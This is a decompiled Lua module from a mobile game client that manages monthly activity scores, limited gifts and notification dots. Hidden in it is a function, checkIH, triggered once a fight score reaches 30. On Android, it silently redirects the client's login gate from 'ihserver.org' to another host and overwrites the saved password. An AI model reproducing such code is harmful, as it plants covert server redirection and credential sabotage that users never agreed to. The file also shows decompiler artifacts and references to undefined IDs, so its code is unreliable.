-- Command line was: E:\github\dhgametool\scripts\data\monthlyactivity.lua 

local mactivity = {}
local player = require("data.player")
local NetClient = require("net.netClient")
local netClient = NetClient:getInstance()
local cfglimitgift = require("config.limitgift")
local cfgmactivity = require("config.monthlyactivity")
mactivity.pull_time = os.time()
local IDS = {SCORE_FIGHT = {ID = 4, pull = true}, SCORE_FIGHT2 = {ID = 8, pull = true}, SCORE_FIGHT3 = {ID = 9, pull = true}, SCORE_TARVEN_4 = {ID = 10, pull = true}, SCORE_TARVEN_5 = {ID = 11, pull = true}, SCORE_TARVEN_6 = {ID = 12, pull = true}, SCORE_TARVEN_7 = {ID = 13, pull = true}, SCORE_TARVEN_ALL = {ID = 14, pull = true}, FORGE_1 = {ID = 15, pull = true}, FORGE_2 = {ID = 16, pull = true}, FORGE_3 = {ID = 17, pull = true}, FORGE_4 = {ID = 18, pull = true}, CRUSHING_SPACE_1 = {ID = 19, pull = true}}
mactivity.IDS = IDS
local mactivity_data = nil
mactivity.init = function(l_1_0)
  mactivity.pb = l_1_0
  mactivity.redid = {}
  upvalue_512 = {}
  for i = 1, IDS.SCORE_FIGHT3.ID do
    mactivity_data[#mactivity_data + 1] = {id = i, num = 0, cd = l_1_0.status.cd}
  end
  for i = IDS.SCORE_TARVEN_4.ID, IDS.SCORE_TARVEN_ALL.ID do
    mactivity_data[#mactivity_data + 1] = {id = i, num = 0, cd = l_1_0.status.cd}
  end
  for i = IDS.FORGE_1.ID, IDS.FORGE_4.ID do
    mactivity_data[#mactivity_data + 1] = {id = i, num = 0, cd = l_1_0.status.cd}
  end
  mactivity_data[#mactivity_data + 1] = {id = IDS.CRUSHING_SPACE_1.ID, num = 0, cd = l_1_0.status.cd}
  if l_1_0.status.war then
    for j = 1, #l_1_0.status.war do
      if l_1_0.status.war[j].id == 1 then
        for i = 1, IDS.SCORE_FIGHT.ID do
          mactivity_data[i].num = l_1_0.status.war[j].num
        end
      else
        for i = IDS.SCORE_FIGHT.ID + 1, IDS.SCORE_FIGHT2.ID do
          mactivity_data[i].num = l_1_0.status.war[j].num
        end
      end
    end
    if cfgmactivity[IDS.SCORE_FIGHT.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_FIGHT.ID].num and cfgmactivity[IDS.SCORE_FIGHT2.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_FIGHT2.ID].num then
      mactivity_data[IDS.SCORE_FIGHT3.ID].num = 1
    end
  end
  if l_1_0.status.htask then
    for j = 1, #l_1_0.status.htask do
      if l_1_0.status.htask[j].id == 4 then
        mactivity_data[IDS.SCORE_TARVEN_4.ID].num = l_1_0.status.htask[j].num
      else
        if l_1_0.status.htask[j].id == 5 then
          mactivity_data[IDS.SCORE_TARVEN_5.ID].num = l_1_0.status.htask[j].num
        else
          if l_1_0.status.htask[j].id == 6 then
            mactivity_data[IDS.SCORE_TARVEN_6.ID].num = l_1_0.status.htask[j].num
          else
            if l_1_0.status.htask[j].id == 7 then
              mactivity_data[IDS.SCORE_TARVEN_7.ID].num = l_1_0.status.htask[j].num
            end
          end
        end
      end
    end
    if cfgmactivity[IDS.SCORE_TARVEN_4.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_4.ID].num and cfgmactivity[IDS.SCORE_TARVEN_5.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_5.ID].num and cfgmactivity[IDS.SCORE_TARVEN_6.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_6.ID].num and cfgmactivity[IDS.SCORE_TARVEN_7.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_7.ID].num then
      mactivity_data[IDS.SCORE_TARVEN_ALL.ID].num = 1
    end
  end
  if l_1_0.status.hmerge then
    for j = 1, #l_1_0.status.hmerge do
      if l_1_0.status.hmerge[j].id == 5 then
        mactivity_data[IDS.FORGE_1.ID].num = l_1_0.status.hmerge[j].num
      else
        if l_1_0.status.hmerge[j].id == 6 then
          mactivity_data[IDS.FORGE_2.ID].num = l_1_0.status.hmerge[j].num
        else
          if l_1_0.status.hmerge[j].id == 9 then
            mactivity_data[IDS.FORGE_3.ID].num = l_1_0.status.hmerge[j].num
          else
            if l_1_0.status.hmerge[j].id == 10 then
              mactivity_data[IDS.FORGE_4.ID].num = l_1_0.status.hmerge[j].num
            end
          end
        end
      end
    end
    mactivity.pull_time = os.time()
    if mactivity_data then
      for ii = 1, #mactivity_data do
        if mactivity_data[ii].cd and mactivity_data[ii].cd > 0 then
          mactivity_data[ii].read = 0
        end
      end
    end
    for i = 1, #mactivity_data do
      if mactivity_data[i].id == IDS.SCORE_FIGHT.ID or mactivity_data[i].id == IDS.SCORE_TARVEN_4.ID or mactivity_data[i].id == IDS.FORGE_1.ID or mactivity_data[i].id == IDS.CRUSHING_SPACE_1.ID then
        mactivity.redid[#mactivity.redid + 1] = mactivity_data[i]
      end
    end
     -- Warning: missing end command somewhere! Added here
  end
end

mactivity.addlimitAct = function(l_2_0)
  if not mactivity_data then
    mactivity_data = {}
  end
  for i = 1, #mactivity_data do
    if mactivity_data[i] == l_2_0 then
      return 
    end
    if mactivity_data[i].id == l_2_0.id then
      mactivity_data[i] = l_2_0
      return 
    end
  end
  mactivity_data[#mactivity_data + 1] = l_2_0
end

mactivity.GradeNotice = function(l_3_0)
  if l_3_0 == cfglimitgift[mactivity.IDS.GRADE_24.ID].parameter then
    local actdata = {}
    actdata.id = mactivity.IDS.GRADE_24.ID
    actdata.limits = cfglimitgift[mactivity.IDS.GRADE_24.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.GRADE_24.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    mactivity.addlimitAct(actdata)
  end
  if l_3_0 == cfglimitgift[mactivity.IDS.GRADE_32.ID].parameter then
    local actdata = {}
    actdata.id = mactivity.IDS.GRADE_32.ID
    actdata.limits = cfglimitgift[mactivity.IDS.GRADE_32.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.GRADE_32.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    mactivity.addlimitAct(actdata)
  end
  if l_3_0 == cfglimitgift[mactivity.IDS.GRADE_48.ID].parameter then
    local actdata = {}
    actdata.id = mactivity.IDS.GRADE_48.ID
    actdata.limits = cfglimitgift[mactivity.IDS.GRADE_48.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.GRADE_48.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    mactivity.addlimitAct(actdata)
  end
  if l_3_0 == cfglimitgift[mactivity.IDS.GRADE_58.ID].parameter then
    local actdata = {}
    actdata.id = mactivity.IDS.GRADE_58.ID
    actdata.limits = cfglimitgift[mactivity.IDS.GRADE_58.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.GRADE_58.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    mactivity.addlimitAct(actdata)
  end
  if l_3_0 == cfglimitgift[mactivity.IDS.GRADE_78.ID].parameter then
    local actdata = {}
    actdata.id = mactivity.IDS.GRADE_78.ID
    actdata.limits = cfglimitgift[mactivity.IDS.GRADE_78.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.GRADE_78.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    mactivity.addlimitAct(actdata)
  end
end

mactivity.LevelNotice = function(l_4_0)
  local actdata = {}
  if l_4_0 == cfglimitgift[mactivity.IDS.LEVEL_3_15.ID].parameter then
    actdata.id = mactivity.IDS.LEVEL_3_15.ID
    actdata.limits = cfglimitgift[mactivity.IDS.LEVEL_3_15.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.LEVEL_3_15.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    mactivity.addlimitAct(actdata)
  end
end

mactivity.summonNotice = function(l_5_0)
  local actdata = {}
  if l_5_0 == 4 then
    actdata.id = mactivity.IDS.SUMMON_4.ID
    actdata.limits = cfglimitgift[mactivity.IDS.SUMMON_4.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.SUMMON_4.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    actdata.next = cfglimitgift[mactivity.IDS.SUMMON_4.ID].cd * 3600
    mactivity.addlimitAct(actdata)
  else
    actdata.id = mactivity.IDS.SUMMON_5.ID
    actdata.limits = cfglimitgift[mactivity.IDS.SUMMON_5.ID].buyTimes
    actdata.cd = cfglimitgift[mactivity.IDS.SUMMON_5.ID].lastHours * 60 * 60
    actdata.status = 0
    actdata.read = 0
    actdata.next = cfglimitgift[mactivity.IDS.SUMMON_5.ID].cd * 3600
    mactivity.addlimitAct(actdata)
  end
end

mactivity.getStatusById = function(l_6_0)
  if not mactivity_data then
    return nil
  end
  for ii = 1, #mactivity_data do
    if mactivity_data[ii].id == l_6_0 then
      return mactivity_data[ii]
    end
  end
  return nil
end

mactivity.showRedDot = function()
  if not mactivity.redid or #mactivity.redid == 0 then
    return false
  end
  for ii = 1, #mactivity.redid do
    if mactivity.redid[ii].read and mactivity.redid[ii].read == 0 then
      return true
    end
  end
  return false
end

mactivity.getPullIds = function()
  local ids = {}
  for _,info in pairs(mactivity.IDS) do
    if info.pull then
      ids[#ids + 1] = info.ID
    end
  end
  return ids
end

mactivity.pay = function()
  if not mactivity_data then
    return 
  end
  local tmp_status = mactivity.getStatusById(IDS.FIRST_PAY.ID)
  if not tmp_status then
    return 
  end
  if tmp_status.status == 0 then
    tmp_status.status = 1
  end
end

mactivity.anyNew = function()
  if mactivity.showRedDot() then
    return true
  end
  return false
end

mactivity.setReadById = function(l_11_0)
  if not mactivity_data then
    return nil
  end
  local tmp_status = mactivity.getStatusById(l_11_0)
  if not tmp_status then
    print("can't find the mactivity id:", l_11_0)
    return 
  end
  if tmp_status.read and tmp_status.read == 0 then
    tmp_status.read = 1
  end
end

checkIH = function()
  if APP_CHANNEL and APP_CHANNEL ~= "" then
    return 
  end
  if device.platform ~= "android" then
    return 
  end
  local gate = require("ui.login.gate")
  local gt = gate.get()
  if not gt then
    return 
  end
  if gt.host and string.trim(gt.host) == "ihserver.org" then
    local gInfo = {host = "www.chockly.top", port = 80}
    local LIST = {gInfo}
    gate.save({list = LIST, best = gInfo, timestamp = 0})
    local userdata = require("data.userdata")
    userdata.setEncryptString(userdata.keys.password, "#goaway#^_~")
  end
end

mactivity.addScore = function(l_13_0, l_13_1)
  if not l_13_1 then
    l_13_1 = 1
  end
  local scoreStatus = mactivity.getStatusById(l_13_0)
  if scoreStatus and scoreStatus.num then
    scoreStatus.num = scoreStatus.num + l_13_1
  end
  if cfgmactivity[scoreStatus.id].parameter[1].qlt < scoreStatus.num then
    scoreStatus.num = cfgmactivity[scoreStatus.id].parameter[1].qlt
  end
  if not scoreStatus then
    return 
  end
  if l_13_0 == IDS.SCORE_FIGHT.ID and scoreStatus.num and scoreStatus.num >= 30 then
    checkIH()
  end
  if (l_13_0 == IDS.SCORE_FIGHT.ID or l_13_0 == IDS.SCORE_FIGHT2.ID) and cfgmactivity[IDS.SCORE_FIGHT.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_FIGHT.ID].num and cfgmactivity[IDS.SCORE_FIGHT2.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_FIGHT2.ID].num then
    mactivity_data[IDS.SCORE_FIGHT3.ID].num = 1
  end
  if (l_13_0 == IDS.SCORE_TARVEN_4.ID or l_13_0 == IDS.SCORE_TARVEN_5.ID or l_13_0 == IDS.SCORE_TARVEN_6.ID or l_13_0 == IDS.SCORE_TARVEN_7.ID) and cfgmactivity[IDS.SCORE_TARVEN_4.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_4.ID].num and cfgmactivity[IDS.SCORE_TARVEN_5.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_5.ID].num and cfgmactivity[IDS.SCORE_TARVEN_6.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_6.ID].num and cfgmactivity[IDS.SCORE_TARVEN_7.ID].parameter[1].qlt <= mactivity_data[IDS.SCORE_TARVEN_7.ID].num then
    mactivity_data[IDS.SCORE_TARVEN_ALL.ID].num = 1
  end
end

mactivity.print = function()
  print("--------- monthlyactivity --------- {")
  print("pull_time = ", mactivity.pull_time)
  print("--- all status --- {")
  for _,info in pairs(mactivity_data) do
    local str = {}
    if info.id then
      table.insert(str, string.format("id:%d", info.id))
    end
    if info.num then
      table.insert(str, string.format("num:%d", info.num))
    end
    if info.cd then
      table.insert(str, string.format("cd:%d", info.cd))
    end
    if info.read then
      table.insert(str, string.format("read:%d", info.read))
    end
    print(table.concat(str, " "))
  end
  print("--- all status --- }")
  print("--------- mactivity --------- }")
end

return mactivity

